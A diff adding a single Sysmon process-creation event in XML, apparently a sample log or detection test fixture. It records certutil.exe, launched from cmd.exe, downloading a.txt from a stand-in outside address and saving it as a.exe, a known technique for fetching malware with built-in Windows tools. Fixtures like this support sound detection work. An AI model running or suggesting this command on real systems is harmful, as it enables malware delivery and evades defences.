@@ -1,0 +1,19 @@
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System>
+  <Provider Name="Microsoft-Windows-Sysmon"/>
+  <EventID>1</EventID>
+  <TimeCreated SystemTime="2026-03-03T09:41:12.2140000Z"/>
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+  <Computer>ws-017.corp.example.com</Computer>
+ </System>
+ <EventData>
+  <Data Name="UtcTime">2026-03-03 09:41:12.204</Data>
+  <Data Name="ProcessId">6700</Data>
+  <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
+  <Data Name="CommandLine">certutil -urlcache -f
+    http://203.0.113.9/a.txt a.exe</Data>
+  <Data Name="User">CORP\jsmith</Data>
+  <Data Name="IntegrityLevel">Medium</Data>
+  <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+ </EventData>
+</Event>
